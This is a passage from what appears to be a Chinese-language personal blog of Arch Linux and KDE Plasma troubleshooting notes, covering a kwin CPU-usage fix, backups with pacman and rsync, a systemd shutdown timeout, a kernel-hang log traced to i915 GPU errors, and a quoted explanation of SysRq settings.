\u001b[m\u000f\u001b[39;49msleeping,\u001b[m\u000f\u001b[39;49m\u001b[1m 0 \u001b[m\u000f\u001b[39;49mstopped,\u001b[m\u000f\u001b[39;49m\u001b[1m 0 \u001b[m\u000f\u001b[39;49mzombie\u001b[m\u000f\u001b[39;49m\u001b[m\u000f\u001b[39;49m\u001b[K%Cpu(s):\u001b[m\u000f\u001b[39;49m\u001b[1m 28.6 \u001b[m\u000f\u001b[39;49mus,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49msy,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49mni,\u001b[m\u000f\u001b[39;49m\u001b[1m 71.4 \u001b[m\u000f\u001b[39;49mid,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49mwa,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49mhi,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49msi,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49mst\u001b[m\u000f\u001b[39;49m\u001b[m\u000f \u001b[m\u000f\u001b[39;49m\u001b[m\u000f\u001b[39;49m\u001b[KMiB Mem :\u001b[m\u000f\u001b[39;49m\u001b[1m 7835.3 \u001b[m\u000f\u001b[39;49mtotal,\u001b[m\u000f\u001b[39;49m\u001b[1m 584.1 \u001b[m\u000f\u001b[39;49mfree,\u001b[m\u000f\u001b[39;49m\u001b[1m 3807.3 \u001b[m\u000f\u001b[39;49mused,\u001b[m\u000f\u001b[39;49m\u001b[1m 4760.9 \u001b[m\u000f\u001b[39;49mbuff/cache\u001b[m\u000f\u001b[39;49m\u001b[m\u000f \u001b[m\u000f\u001b[39;49m\u001b[m\u000f \u001b[m\u000f\u001b[39;49m\u001b[m\u000f\u001b[39;49m\u001b[KMiB Swap:\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49mtotal,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49mfree,\u001b[m\u000f\u001b[39;49m\u001b[1m 0.0 \u001b[m\u000f\u001b[39;49mused.\u001b[m\u000f\u001b[39;49m\u001b[1m 4028.0 \u001b[m\u000f\u001b[39;49mavail Mem \u001b[m\u000f\u001b[39;49m\u001b[m\u000f\u001b[39;49m\u001b[K\u001b[K\u001b[7m 进程号 USER PR NI VIRT RES SHR %CPU %MEM TIME+ COMMAND \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f\u001b[1m 411 root 20 0 859280 87628 30916 R 90.9 1.1 248:56.68 Xorg \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f\u001b[1m 19316 xeonds 20 0 4028616 892492 271492 R 72.7 11.1 0:17.50 firefox \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 19461 xeonds 20 0 2713128 171852 88252 S 18.2 2.1 0:06.27 WebExte+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f\u001b[1m 19901 xeonds 20 0 15440 5760 3584 R 9.1 0.1 0:00.01 top \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 1 root 20 0 22220 10228 7028 S 0.0 0.1 0:02.61 systemd \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 2 root 20 0 0 0 0 S 0.0 0.0 0:00.04 kthreadd \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 3 root 20 0 0 0 0 S 0.0 0.0 0:00.00 pool_wo+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 4 root 0 -20 0 0 0 I 0.0 0.0 0:00.00 kworker+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 5 root 0 -20 0 0 0 I 0.0 0.0 0:00.00 kworker+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 6 root 0 -20 0 0 0 I 0.0 0.0 0:00.00 kworker+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 7 root 0 -20 0 0 0 I 0.0 0.0 0:00.00 kworker+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 9 root 0 -20 0 0 0 I 0.0 0.0 0:00.00 kworker+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 12 root 0 -20 0 0 0 I 0.0 0.0 0:00.00 kworker+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 14 root 20 0 0 0 0 I 0.0 0.0 0:00.00 rcu_tas+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 15 root 20 0 0 0 0 I 0.0 0.0 0:00.00 rcu_tas+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 16 root 20 0 0 0 0 I 0.0 0.0 0:00.00 rcu_tas+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[m\u000f 17 root 20 0 0 0 0 S 0.0 0.0 0:30.95 ksoftir+ \u001b[m\u000f\u001b[39;49m\u001b[K\u001b[?1l\u001b&gt;\u001b[25;1H\u001b[34h\u001b[?25h\u001b[K 抽象是抽象了点，但是能看出来好像是Xorg在发电，试试去tty重启xorg看看。 最后发现Xorg是sddm启动的，没办法直接重启了下sddm，问题解决，但是最不爽的是不知道问题到底是咋解决的。 找到一个博客，发现好像不是xorg的问题，而是kwin的问题：暂停恢复合成时，会导致kwin卡顿，这时候重启一下kwin_x11就行了。 这就好说了： 1systemctl --user restart plasma-kwin_x11 或者这个 1setsid kwin_x11 --replace &amp; ref:律回彼境 试了试，问题完美解决，CPU占用也正常了。 参考：KDE解决GUI界面卡顿的问题 组合键其实主要是KDE Plasma的相关组合键。偶尔会意外发现一些组合键，就记录在这里了。 切换桌面：ctrl+F* 无极缩放：win+ctrl+鼠标滚轮，真的好丝滑QAQ 莫得休眠Hibernate选项找了半天发现是系统安装的时候没设置swap交换分区。不过暂时默认的睡眠也够用了，之后再考虑吧。 备份 ref:现代化的 Archlinux 安装，Btrfs、快照、休眠以及更多。 其一就是软件列表备份。pacman -Qe &gt;&gt; installed.txt就可以备份已安装软件列表 其二就是备份根目录数据。其中的-avrh用于保留文件权限。以及似乎必须得注意路径末尾的斜杠问题，rsync好像会区分这两个路径。sudo rsync -avrh --progress /home/ /mnt/backup/ 关机等待时间一直忘了改这个东西了。有时候等待一些服务停止的时候等到倒计时结束才会停止。可以适当减少倒计时的时长环节这个问题。 对应的参数在/etc/systemd/system.conf，更改DefaultTimeoutStopSec=90s为你想要的等待时间，我改成10s了。 记一次内核卡死挺草的说起来。征兆是先是firefox崩了，然后把kwin也爆了。第二次是kwin自己爆炸了，然后玩mc java的时候就OOM+CPU 100%了。问了下群里老哥，发现没开SysRq，不然的话就能在内核卡死的时候使用一些组合键来让内核执行一些有限操作。 等待了大概40min，无果，只能以&gt;2min的不规律时间响应键盘中断，老哥推测可能是活锁，而且OOM也没来得及出动。所以就含泪重启，跟自己tmux里边一堆窗口告别了。 重启，看看内核日志：sudo journalctl -k -b-1查看上次启动的日志： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200Jan 16 10:43:33 ark-station kernel: Bluetooth: hci0: Malformed MSFT vendor event: 0x02Jan 16 10:43:33 ark-station kernel: Bluetooth: hci0: Found Intel DDC parameters: intel/ibt-0040-4150.ddcJan 16 10:43:33 ark-station kernel: Bluetooth: hci0: Applying Intel DDC parameters completedJan 16 10:43:33 ark-station kernel: Bluetooth: hci0: Firmware timestamp 2023.42 buildtype 1 build 73111Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: Microcode SW error detected. Restarting 0x0.Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: Start IWL Error Log Dump:Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: Transport status: 0x0000004A, valid: 6Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: Loaded firmware version: 83.e8f84e98.0 so-a0-hr-b0-83.ucodeJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000071 | NMI_INTERRUPT_UMAC_FATAL Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x000002F0 | trm_hw_status0Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | trm_hw_status1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x004D9024 | branchlink2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x004CF2F2 | interruptlink1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x004CF2F2 | interruptlink2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00015346 | data1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000010 | data2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | data3Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x0022F89E | beacon timeJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x001E1C6F | tsf lowJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | tsf hiJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | time gp1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x001ED6DD | time gp2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000001 | uCode revision typeJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000053 | uCode version majorJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0xE8F84E98 | uCode version minorJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000370 | hw versionJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00C80002 | board versionJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x80DDFC04 | hcmdJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00020000 | isr0Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | isr1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x48F00002 | isr2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00C3000C | isr3Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | isr4Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x001C0103 | last cmd IdJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00015346 | wait_eventJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000010 | l2p_controlJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000020 | l2p_durationJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x0000003F | l2p_mhvalidJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | l2p_addr_matchJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000009 | lmpm_pmg_selJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | timestampJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00004870 | flow_handlerJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: Start IWL Error Log Dump:Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: Transport status: 0x0000004A, valid: 7Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x2010190E | ADVANCED_SYSASSERTJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | umac branchlink1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x804703E0 | umac branchlink2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0xC0081500 | umac interruptlink1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | umac interruptlink2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x0101971C | umac data1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0xDEADBEEF | umac data2Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0xDEADBEEF | umac data3Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000053 | umac majorJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0xE8F84E98 | umac minorJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x001ED6D7 | frame pointerJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0xC0886BE0 | stack pointerJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x0024010D | last host cmdJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000000 | isr status regJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: IML/ROM dump:Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000B03 | IML/ROM error/stateJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x0000518C | IML/ROM data1Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000090 | IML/ROM WFPM_AUTH_KEY_0Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: Fseq Registers:Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x60000000 | FSEQ_ERROR_CODEJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00350002 | FSEQ_TOP_INIT_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00150001 | FSEQ_CNVIO_INIT_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x0000A482 | FSEQ_OTP_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00000003 | FSEQ_TOP_CONTENT_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x4552414E | FSEQ_ALIVE_TOKENJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00080400 | FSEQ_CNVI_IDJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x01300504 | FSEQ_CNVR_IDJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00080400 | CNVI_AUX_MISC_CHIPJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x01300504 | CNVR_AUX_MISC_CHIPJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x05B0905B | CNVR_SCU_SD_REGS_SD_REG_DIG_DCDC_VTRIMJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x0000025B | CNVR_SCU_SD_REGS_SD_REG_ACTIVE_VDIG_MIRRORJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00150001 | FSEQ_PREV_CNVIO_INIT_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00350002 | FSEQ_WIFI_FSEQ_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x00350002 | FSEQ_BT_FSEQ_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: 0x000000DC | FSEQ_CLASS_TP_VERSIONJan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: UMAC CURRENT PC: 0x8048f214Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: LMAC1 CURRENT PC: 0xd0Jan 16 10:43:33 ark-station kernel: iwlwifi 0000:00:14.3: WRT: Collecting data: ini trigger 4 fired (delay=0ms).Jan 16 10:43:33 ark-station kernel: ieee80211 phy0: Hardware restart was requestedJan 16 10:43:34 ark-station kernel: iwlwifi 0000:00:14.3: WRT: Invalid buffer destinationJan 16 10:43:34 ark-station kernel: Bluetooth: MGMT ver 1.22Jan 16 10:43:34 ark-station kernel: Bluetooth: hci0: Bad flag given (0x1) vs supported (0x0)Jan 16 10:43:34 ark-station kernel: iwlwifi 0000:00:14.3: WFPM_UMAC_PD_NOTIFICATION: 0x20Jan 16 10:43:34 ark-station kernel: iwlwifi 0000:00:14.3: WFPM_LMAC2_PD_NOTIFICATION: 0x1fJan 16 10:43:34 ark-station kernel: iwlwifi 0000:00:14.3: WFPM_AUTH_KEY_0: 0x90Jan 16 10:43:34 ark-station kernel: iwlwifi 0000:00:14.3: CNVI_SCU_SEQ_DATA_DW9: 0x10Jan 16 10:43:34 ark-station kernel: iwlwifi 0000:00:14.3: RFIm is deactivated, reason = 5Jan 16 10:43:38 ark-station kernel: wlan0: authenticate with e2:cb:4f:01:72:a7Jan 16 10:43:38 ark-station kernel: wlan0: send auth to e2:cb:4f:01:72:a7 (try 1/3)Jan 16 10:43:38 ark-station kernel: wlan0: authenticatedJan 16 10:43:38 ark-station kernel: wlan0: associate with e2:cb:4f:01:72:a7 (try 1/3)Jan 16 10:43:38 ark-station kernel: wlan0: RX AssocResp from e2:cb:4f:01:72:a7 (capab=0x1511 status=0 aid=1)Jan 16 10:43:38 ark-station kernel: wlan0: associatedJan 16 10:47:20 ark-station kernel: kwin_wayland[901]: segfault at 0 ip 0000561fd234c33f sp 00007fff916f35c0 error 4 in kwin_wayland[561fd2348000+110000] likely on CPU 13 (core 25, socket 0)Jan 16 10:47:20 ark-station kernel: Code: 8b 47 58 48 8b 58 10 48 01 c3 48 63 40 04 4c 8d 24 c3 49 39 dc 75 0d eb 2a 66 90 48 83 c3 08 49 39 dc 74 1f 48 8b 3b 48 89 ee &lt;48&gt; 8b 07 ff 50 60 84 c0 74 e7 48 83 c4 08 5b 5d 41 5c 41 5d c3 0fJan 16 10:49:41 ark-station systemd-fstab-generator[2389003]: Failed to create unit file '/run/systemd/generator/-.mount', as it already exists. Duplicate entry in '/etc/fstab'?Jan 16 11:15:18 ark-station kernel: wlan0: deauthenticating from e2:cb:4f:01:72:a7 by local choice (Reason: 3=DEAUTH_LEAVING)Jan 16 11:15:18 ark-station kernel: wlan0: authenticate with f0:9b:b8:16:62:30Jan 16 11:15:18 ark-station kernel: wlan0: 80 MHz not supported, disabling VHTJan 16 11:15:18 ark-station kernel: wlan0: send auth to f0:9b:b8:16:62:30 (try 1/3)Jan 16 11:15:18 ark-station kernel: wlan0: authenticatedJan 16 11:15:18 ark-station kernel: wlan0: associate with f0:9b:b8:16:62:30 (try 1/3)Jan 16 11:15:18 ark-station kernel: wlan0: RX AssocResp from f0:9b:b8:16:62:30 (capab=0x1421 status=0 aid=2)Jan 16 11:15:18 ark-station kernel: wlan0: associatedJan 16 11:15:18 ark-station kernel: wlan0: Limiting TX power to 20 (20 - 0) dBm as advertised by f0:9b:b8:16:62:30Jan 16 11:21:36 ark-station kernel: wlan0: disconnect from AP f0:9b:b8:16:62:30 for new auth to f0:9b:b8:16:62:40Jan 16 11:21:36 ark-station kernel: wlan0: authenticate with f0:9b:b8:16:62:40Jan 16 11:21:36 ark-station kernel: wlan0: send auth to f0:9b:b8:16:62:40 (try 1/3)Jan 16 11:21:36 ark-station kernel: wlan0: authenticatedJan 16 11:21:36 ark-station kernel: wlan0: associate with f0:9b:b8:16:62:40 (try 1/3)Jan 16 11:21:36 ark-station kernel: wlan0: RX ReassocResp from f0:9b:b8:16:62:40 (capab=0x1501 status=0 aid=4)Jan 16 11:21:36 ark-station kernel: wlan0: associatedJan 16 11:21:36 ark-station kernel: wlan0: Limiting TX power to 30 (30 - 0) dBm as advertised by f0:9b:b8:16:62:40Jan 16 11:22:44 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* Atomic update failure on pipe A (start=282494 end=282495) time 187 us, min 1579, max 1599, scanline start 1564, end 1602Jan 16 11:41:50 ark-station kernel: wlan0: disconnect from AP f0:9b:b8:16:62:40 for new auth to f0:9b:b8:16:5c:40Jan 16 11:41:50 ark-station kernel: wlan0: authenticate with f0:9b:b8:16:5c:40Jan 16 11:41:50 ark-station kernel: wlan0: send auth to f0:9b:b8:16:5c:40 (try 1/3)Jan 16 11:41:50 ark-station kernel: wlan0: authenticatedJan 16 11:41:50 ark-station kernel: wlan0: associate with f0:9b:b8:16:5c:40 (try 1/3)Jan 16 11:41:50 ark-station kernel: wlan0: RX ReassocResp from f0:9b:b8:16:5c:40 (capab=0x1501 status=0 aid=2)Jan 16 11:41:50 ark-station kernel: wlan0: associatedJan 16 11:41:50 ark-station kernel: wlan0: Limiting TX power to 23 (23 - 0) dBm as advertised by f0:9b:b8:16:5c:40Jan 16 18:00:05 ark-station kernel: wlan0: deauthenticating from f0:9b:b8:16:5c:40 by local choice (Reason: 3=DEAUTH_LEAVING)Jan 16 18:00:05 ark-station kernel: wlan0: authenticate with e2:cb:4f:01:72:a7Jan 16 18:00:05 ark-station kernel: wlan0: send auth to e2:cb:4f:01:72:a7 (try 1/3)Jan 16 18:00:05 ark-station kernel: wlan0: authenticatedJan 16 18:00:05 ark-station kernel: wlan0: associate with e2:cb:4f:01:72:a7 (try 1/3)Jan 16 18:00:05 ark-station kernel: wlan0: RX AssocResp from e2:cb:4f:01:72:a7 (capab=0x1511 status=0 aid=3)Jan 16 18:00:05 ark-station kernel: wlan0: associatedJan 16 18:41:38 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* Atomic update failure on pipe A (start=2487239 end=2487240) time 230 us, min 1579, max 1599, scanline start 1566, end 1613Jan 16 19:34:40 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* Atomic update failure on pipe A (start=2869004 end=2869005) time 158 us, min 1579, max 1599, scanline start 1570, end 1602Jan 16 20:01:05 ark-station kernel: atkbd serio0: Unknown key pressed (translated set 2, code 0x8b on isa0060/serio0).Jan 16 20:01:05 ark-station kernel: atkbd serio0: Use 'setkeycodes e00b &lt;keycode&gt;' to make it known.Jan 16 20:01:05 ark-station kernel: atkbd serio0: Unknown key released (translated set 2, code 0x8b on isa0060/serio0).Jan 16 20:01:05 ark-station kernel: atkbd serio0: Use 'setkeycodes e00b &lt;keycode&gt;' to make it known.Jan 16 20:01:07 ark-station kernel: atkbd serio0: Unknown key pressed (translated set 2, code 0x8a on isa0060/serio0).Jan 16 20:01:07 ark-station kernel: atkbd serio0: Use 'setkeycodes e00a &lt;keycode&gt;' to make it known.Jan 16 20:01:07 ark-station kernel: atkbd serio0: Unknown key released (translated set 2, code 0x8a on isa0060/serio0).Jan 16 20:01:07 ark-station kernel: atkbd serio0: Use 'setkeycodes e00a &lt;keycode&gt;' to make it known.Jan 16 20:02:39 ark-station kernel: atkbd serio0: Unknown key pressed (translated set 2, code 0x8b on isa0060/serio0).Jan 16 20:02:39 ark-station kernel: atkbd serio0: Use 'setkeycodes e00b &lt;keycode&gt;' to make it known.Jan 16 20:02:39 ark-station kernel: atkbd serio0: Unknown key released (translated set 2, code 0x8b on isa0060/serio0).Jan 16 20:02:39 ark-station kernel: atkbd serio0: Use 'setkeycodes e00b &lt;keycode&gt;' to make it known.Jan 16 20:02:51 ark-station kernel: atkbd serio0: Unknown key pressed (translated set 2, code 0x8a on isa0060/serio0).Jan 16 20:02:51 ark-station kernel: atkbd serio0: Use 'setkeycodes e00a &lt;keycode&gt;' to make it known.Jan 16 20:02:51 ark-station kernel: atkbd serio0: Unknown key released (translated set 2, code 0x8a on isa0060/serio0).Jan 16 20:02:51 ark-station kernel: atkbd serio0: Use 'setkeycodes e00a &lt;keycode&gt;' to make it known.Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* GT0: GUC: Engine reset failed on 0:0 (rcs0) because 0x00000000Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] GPU HANG: ecode 12:1:84dffffb, in Render thread [3009924]Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] Resetting chip for GuC failed to reset engine mask=0x1Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* rcs0 reset request timed out: {request: 00000001, RESET_CTL: 00000001}Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* rcs0 reset request timed out: {request: 00000001, RESET_CTL: 00000001}Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] Render thread[3009924] context reset due to GPU hangJan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] GT0: GuC firmware i915/adlp_guc_70.bin version 70.13.1Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] GT0: HuC firmware i915/tgl_huc.bin version 7.9.3Jan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] GT0: HuC: authenticated for all workloadsJan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] GT0: GUC: submission enabledJan 16 20:18:46 ark-station kernel: i915 0000:00:02.0: [drm] GT0: GUC: SLPC enabledJan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* GT0: GUC: Engine reset failed on 0:0 (rcs0) because 0x00000000Jan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] GPU HANG: ecode 12:1:84dffffb, in Render thread [3009924]Jan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] Resetting chip for GuC failed to reset engine mask=0x1Jan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* rcs0 reset request timed out: {request: 00000001, RESET_CTL: 00000001}Jan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] *ERROR* rcs0 reset request timed out: {request: 00000001, RESET_CTL: 00000001}Jan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] Render thread[3009924] context reset due to GPU hangJan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] GT0: GuC firmware i915/adlp_guc_70.bin version 70.13.1Jan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] GT0: HuC firmware i915/tgl_huc.bin version 7.9.3Jan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] GT0: HuC: authenticated for all workloadsJan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] GT0: GUC: submission enabledJan 16 20:45:01 ark-station kernel: i915 0000:00:02.0: [drm] GT0: GUC: SLPC enabledJan 16 20:49:08 ark-station kernel: INFO: task IPC Launch:2387456 blocked for more than 122 seconds.Jan 16 20:49:16 ark-station kernel: Not tainted 6.6.10-arch1-1 #1Jan 16 20:49:27 ark-station kernel: &quot;echo 0 &gt; /proc/sys/kernel/hung_task_timeout_secs&quot; disables this message.Jan 16 20:49:32 ark-station kernel: task:IPC Launch state:D stack:0 pid:2387456 ppid:870 flags:0x00004002Jan 16 20:49:38 ark-station kernel: Call Trace:Jan 16 20:49:48 ark-station kernel: &lt;TASK&gt;Jan 16 20:50:00 ark-station kernel: __schedule+0x3e7/0x1410Jan 16 20:50:16 ark-station kernel: schedule+0x5e/0xd0Jan 16 20:50:28 ark-station kernel: schedule_preempt_disabled+0x15/0x30Jan 16 20:50:36 ark-station kernel: rwsem_down_write_slowpath+0x203/0x690Jan 16 20:50:43 ark-station kernel: ? prealloc_shrinker+0x6a/0xd0Jan 16 20:50:51 ark-station kernel: ? __pfx_set_anon_super_fc+0x10/0x10Jan 16 20:50:57 ark-station kernel: down_write+0x5b/0x60Jan 16 20:51:04 ark-station kernel: __prealloc_shrinker+0x70/0x350Jan 16 20:51:11 ark-station kernel: ? kvasprintf+0x82/0xd0Jan 16 20:51:17 ark-station kernel: ? __pfx_set_anon_super_fc+0x10/0x10Jan 16 20:51:23 ark-station kernel: prealloc_shrinker+0x7b/0xd0Jan 16 20:51:28 ark-station kernel: alloc_super+0x272/0x2e0Jan 16 20:51:35 ark-station kernel: sget_fc+0x63/0x330Jan 16 20:51:41 ark-station kernel: ? __pfx_mqueue_fill_super+0x10/0x10Jan 16 20:51:55 ark-station kernel: get_tree_nodev+0x27/0x90Jan 16 20:52:02 ark-station kernel: vfs_get_tree+0x26/0xf0Jan 16 20:52:07 ark-station kernel: ? refcount_dec_and_lock+0x11/0x70Jan 16 20:52:12 ark-station kernel: fc_mount+0x12/0x40Jan 16 20:52:17 ark-station kernel: mq_init_ns+0x10f/0x1b0Jan 16 20:52:21 ark-station kernel: copy_ipcs+0x134/0x270Jan 16 20:52:26 ark-station kernel: create_new_namespaces+0xa1/0x2e0 看了一圈最后找到个issue，看样子我应该是drm/i195受害者咯。 SysRq: Keyboard Shortcuts systemd has the SysRq permissions bitmask set to 0x10 by default, which does not allow process signalling or rebooting, among other things. To allow full use of the SysRq key on your system, add kernel.sysrq = 1 to your sysctl configuration. Values greater than 1 can be used to selectively enable SysRq functions; see the Linux kernel documentation for details. If you want to make sure it will be enabled even before the partitions are mounted and in the initrd, then add sysrq_always_enabled=1 to your kernel parameters. Note that changing the setting through these methods will cause the changes to persist across reboots. If you want to try changing the SysRq settings for just your current session, you can run either sysctl kernel.sysrq=1 or echo “1” &gt; /proc/sys/kernel/sysrq. There are some obvious security risks involved in fully enabling the SysRq key. In addition to forcing reboots and the like, it can be used to dump the contents of the CPU registers, which could theoretically reveal sensitive information. Since using it requires physical access to the system (unless you go out of your way), most desktop users will probably consider the level of risk acceptable. That said, make sure you fully understand the implications of enabling it and the dynamics of the larger context in which your system is operating before you 